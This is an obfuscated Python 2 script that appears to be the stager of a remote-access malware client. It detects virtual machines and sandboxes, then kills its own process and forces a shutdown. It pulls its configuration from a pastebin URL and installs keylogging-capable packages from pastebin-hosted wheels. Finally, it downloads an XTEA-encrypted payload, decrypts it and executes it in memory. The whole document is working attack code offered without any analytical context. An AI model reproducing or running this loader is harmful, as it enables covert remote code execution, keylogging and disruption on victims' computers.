#!/usr/bin/python
c=bytes
b=None
Q=True
L=Exception
eh=range
eS=len
er=str
ej=chr
eP=ord
eF=zip
eB=globals
es=file
eK=bool
import os
U=os.getpid
C=os.remove
d=os.execv
V=os.name
I=os.path
z=os.chdir
M=os.environ
H=os.popen
import sys
G=sys.prefix
D=sys.argv
y=sys.executable
import time
import json
v=json.loads
import struct
T=struct.calcsize
J=struct.unpack
w=struct.pack
import base64
a=base64.b64decode
import urllib
A=urllib.urlopen
import marshal
import subprocess
f=subprocess.call
o=subprocess.Popen
x=subprocess.PIPE
def i(F):
 global Y
 if Y:
  print(c(F))
def W(output=b):
 global Y
 i(output)
 if not Y:
  if V is 'nt':
   R('taskkill /pid %d'%U())
   R('shutdown /p /f')
  else:
   R('kill -9 %d'%U())
   R('shutdown --poweroff --no-wall')
def R(cmd):
 global Y
 try:
  _=o(cmd,0,b,b,x,x,shell=Q)
 except L as e:
  i(e)
def p(e,key):
 global Y
 e =a(e)
 h =[e[i*8:((i+1)*8)]for i in eh(eS(e)//8)]
 S =h[0]
 r =[]
 for j in h[1:]:
  u,v=J("!2L",j)
  k =J("!4L",key)
  d,m=0x9e3779b9L,0xffffffffL
  s =(d*32)&m
  for _ in eh(32):
   v =(v-(((u<<4^u>>5)+u)^(s+k[s>>11&3])))&m
   s =(s-d)&m
   u =(u-(((v<<4^v>>5)+v)^(s+k[s&3])))&m
  P =w("!2L",u,v)
  F =er().join(ej(eP(x)^eP(y))for x,y in eF(S,P))
  S =j
  r.append(F)
 return er().join(r).rstrip(ej(0))
def t(*args,**kwargs):
 global Y
 B =H('where pip' if V is 'nt' else 'which pip').read().rstrip()
 if not B:
  exec A("https://bootstrap.pypa.io/get-pip.py").read()in eB()
  d(y,['python']+[I.abspath(D[0])]+D[1:])
 else:
  if not kwargs.get('config'):
   W('missing config')
  else:
   s=v(A(kwargs.get('config')).read())
   z(I.expandvars('%TEMP%'))if V is 'nt' else z('/tmp')
   K=v(A(s['t']).read()).get(V).get(er(T('P')*8))
   for g,url in K.items():
    if not f([B,'show',g],0,b,b,x,x,shell=Q)==0:
     R([B,'install',g])
     if not f([B,'show',g],0,b,b,x,x,shell=Q)==0:
      if 'pastebin' not in url:
       R([B,'install',url])
      else:
       if 'pyHook' in g:
        m='pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
        with es(m,'wb')as fp:
         fp.write(a(A(url).read()))
        R([B,'install',m])
        if I.isfile(m):
         C(m)
       elif 'pypiwin32' in g:
        m='pywin32-221-cp27-cp27m-win_amd64.whl'
        with es(m,'wb')as fp:
         fp.write(a(A(url).read()))
        R([B,'install',m])
        n =I.join(G,I.join('Scripts','pywin32_postinstall.py'))
        if I.isfile(n):
         R([n,'-install'])
        if I.isfile(m):
         C(m)
       elif 'pycrypto' in g:
        m='pycrypto-2.6.1-cp27-none-win_amd64.whl'
        with es(m,'wb')as fp:
         fp.write(a(A(url).read()))
        R([B,'install',m])
        if I.isfile(m):
         C(m)
   return s
def l(*args,**kwargs):
 global Y
 if kwargs.get('checkvm'):
  N=[_ for _ in M.keys()if 'VBOX' in _.upper()]
  k =[i.split()[0 if V is 'nt' else-1]for i in H('tasklist' if V is 'nt' else 'ps').read().splitlines()[3:]if i.split()[c].lower().split('.')[0]in['xenservice','vboxservice','vboxtray','vmusrvc','vmsrvc','vmwareuser','vmwaretray','vmtoolsd','vmcompute','vmmem']]
  if eS(N+k):
   W('virtual machine or sandbox was detected')
 if kwargs.get('config'):
  s=t(**kwargs)
  X=A(s.get('z')).read()
  E=A(s.get('u')).read()
  l ='if __name__ == "__main__":\n\tpayload=Client(config="{}")\n\tpayload.run()'.format(kwargs.get('config'))
  q =a(X)
  O =p(E,q)
  exec '\n\n'.join([O,l])in eB()
 else:
  W()
if __name__=='__main__':
 Y=eK(1)
 l(config='https://pastebin.com/raw/si8MrN5X')
